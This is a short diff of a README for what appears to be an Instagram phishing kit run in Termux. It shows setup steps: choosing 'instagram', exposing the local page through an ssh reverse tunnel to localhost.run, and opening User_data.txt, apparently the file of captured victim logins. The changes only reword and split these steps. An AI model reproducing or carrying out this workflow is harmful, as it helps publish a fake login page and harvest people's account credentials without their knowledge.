@@ -27,14 +27,18 @@ bash setup.sh
 ```
 instagram
 ```
-### [Termux] New Tap
+### Exit Termux New SESSION 
 ```
 ssh -R 80:localhost:8080 nokey@localhost.run
 ```
 ```
+cd
+```
+```
 nano /storage/emulated/0/Download/User_data.txt
 ```
-- `CTRL +  x enter open User_data.txt`
+- `CTRL +  x enter`
+- `open User_data.txt`
 
 ### [Termux] Help Commend
 
